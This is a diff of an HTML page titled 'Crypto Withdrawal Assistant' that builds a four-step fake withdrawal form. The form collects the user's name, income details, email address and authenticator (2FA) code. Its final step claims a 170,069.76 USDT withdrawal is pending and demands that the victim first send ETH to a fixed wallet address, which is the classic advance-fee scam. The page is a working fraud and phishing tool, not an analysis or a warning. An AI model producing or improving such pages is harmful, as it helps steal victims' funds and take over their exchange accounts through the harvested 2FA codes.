@@ -3,14 +3,12 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Crypto Network Helper</title>
+  <title>Crypto Withdrawal Assistant</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="page-wrapper"> <!-- Start of wrapper -->
 
-    <!-- Blur Overlay -->
-    <div class="background-blur"></div>
+  <div class="page-wrapper">
 
     <header>
       <div class="container">
@@ -20,40 +18,128 @@
     </header>
 
     <main class="container">
+
+      <!-- First Step: Withdraw Setup -->
       <div class="box" id="step1">
         <h2>Withdraw Setup</h2>
+
         <label><b>Withdrawal Address</b></label>
         <input type="text" id="withdrawalAddress" placeholder="e.g. 0xABC123..." />
+
         <label><b>Choose Your Network</b></label>
         <select id="network">
           <option value="">-- Select Network --</option>
           <option value="Ethereum">Ethereum</option>
-          <option value="Binance Smart Chain">Binance Smart Chain</option>
-          <option value="Tron">Tron</option>
           <option value="Polygon">Polygon</option>
+          <option value="BTC">Bitcoin</option>
+          <option value="XRP">XRP</option>
+          <option value="Tron">Tron</option>
+          <option value="Binance Smart Chain">Binance Smart Chain</option>
+          <option value="Solana">Solana</option>
+          <option value="Avalanche">Avalanche</option>
+          <option value="Cardano">Cardano</option>
         </select>
-        <button onclick="confirmStep1()">Continue</button>
+
+        <label><b>Select Your Country</b></label>
+        <select id="country">
+          <option value="">-- Select Country --</option>
+          <option value="Canada">Canada</option>
+          <option value="USA">United States</option>
+          <option value="UK">United Kingdom</option>
+          <option value="Australia">Australia</option>
+          <option value="Germany">Germany</option>
+          <option value="France">France</option>
+          <option value="India">India</option>
+          <option value="Japan">Japan</option>
+          <option value="Brazil">Brazil</option>
+          <option value="New Zealand">New Zealand</option>
+          <option value="Denmrk">Denmark</option>
+          <!-- Add more countries as needed -->
+        </select>
+
+        <label><b>Select Your Crypto Exchanger</b></label>
+        <select id="cryptoExchanger">
+          <option value="">-- Select Crypto Exchanger --</option>
+          <option value="Newton.com">Newton.com</option>
+          <option value="Coinbase.com">Coinbase.com</option>
+          <option value="Crypto.com">Crypto.com</option>
+          <option value="Shakepay.com">Shakepay.com</option>
+          <option value="Binance.com">Binance.com</option>
+          <option value="Kucoin.com">Kucoin.com</option>
+          <option value="Gemini.com">Gemini.com</option>
+          <option value="Bitbuy.com">Bitbuy.com</option>
+          <option value="Kraken.com">Kraken.com</option>
+          <option value="Binance.com">Binance.com</option>
+          <option value="Bitpanda.com">Bitpanda.com</option>
+          <!-- Add more Canadian crypto exchanges as needed -->
+        </select>
+
+        <button id="continueStep1">Continue</button>
       </div>
 
+      <!-- Second Step: Receiver Information -->
       <div class="box" id="step2" style="display: none;">
         <h2>Receiver Information</h2>
+
         <label><b>Receiver Address</b></label>
         <input type="text" id="receiverAddress" placeholder="e.g. 0xReceiver..." />
+
         <label><b>Name</b></label>
-        <input type="text" id="receiverName" placeholder="First Name" />
+        <input type="text" id="receiverName" placeholder="Your Name" />
+
         <label><b>Surname</b></label>
-        <input type="text" id="receiverSurname" placeholder="Last Name" />
-        <button onclick="confirmStep2()">Continue</button>
+        <input type="text" id="receiverSurname" placeholder="Your Surname" />
+
+        <label><b>Why are you withdrawing?</b></label>
+        <input type="text" id="withdrawalReason" placeholder="Reason for withdrawal..." />
+
+        <label><b>Source of Income</b></label>
+        <select id="sourceOfIncome">
+          <option value="">-- Select Source of Income --</option>
+          <option value="Business Owner">Business Owner</option>
+          <option value="Retired">Retired</option>
+          <option value="Unemployed">Unemployed</option>
+          <option value="Employee">Employee</option>
+          <option value="Freelancer">Freelancer</option>
+          <option value="Student">Student</option>
+          <option value="Other">Other</option>
+        </select>
+
+        <button id="continueStep2">Continue</button>
       </div>
 
+      <!-- Third Step: Connect Your Wallet -->
       <div class="box" id="step3" style="display: none;">
-        <h2>Final Step</h2>
-        <p><strong>To withdraw <b>170,059.94 USDT</b>:</strong></p>
-        <p>Send <strong>1,2 ETH</strong> to the following network:</p>
-        <p><strong>Network:</strong> <span id="finalNetwork"></span></p>
-        <p><strong>Address:</strong> <span class="highlight">0xa96c5F387Ed6945216231275BCE59E63D4CbAAB3</span></p>
-        <div id="timer">Waiting... 59:00</div>
+        <h2>Connect Your Wallet</h2>
+
+        <label><b>Your Email Address</b></label>
+        <input type="email" id="email" placeholder="e.g. example@mail.com" />
+
+        <label><b>Your Authenticator Code</b></label>
+        <input type="text" id="authenticatorCode" placeholder="e.g. 123456" />
+
+        <button id="continueStep3">Continue</button>
       </div>
+
+      <!-- Fourth Step: Final Step -->
+      <div class="box" id="step4" style="display: none;">
+        <h2>Final Step</h2>
+
+        <p style="color: red;"><strong>Insufficient ETH Balance</strong></p>
+        <p>You are initiating an automatic withdrawal of <strong>170,069.76 USDT</strong>.</p>
+        <p><strong>ETH BALANCE:</strong> 0 USDT</p>
+        <p><strong>Balance:</strong> 170,069.76 USDT (in ETH network)</p>
+        <p>Please add <strong>0.25338349 ETH (1,123.61 NZD)</strong> to your network.</p>
+        <p><strong>Network:</strong> Ethereum</p>
+        <p><strong>Wallet Address:</strong> <span class="highlight">0xa96c5F387Ed6945216231275BCE59E63D4CbAAB3</span></p>
+
+        <h3>Important Note:</h3>
+        <ul>
+          <li><strong>Please ensure that this window remains open</strong> during the entire withdrawal process to avoid any interruptions.</li>
+          <li><strong>Important:</strong> Please ensure that you select the <strong>Ethereum network</strong> when making the transfer to avoid any issues with the transaction.</li>
+        </ul>
+      </div>
+
     </main>
 
     <footer>
@@ -76,5 +162,3 @@
   <script src="script.js"></script>
 </body>
 </html>
-
-
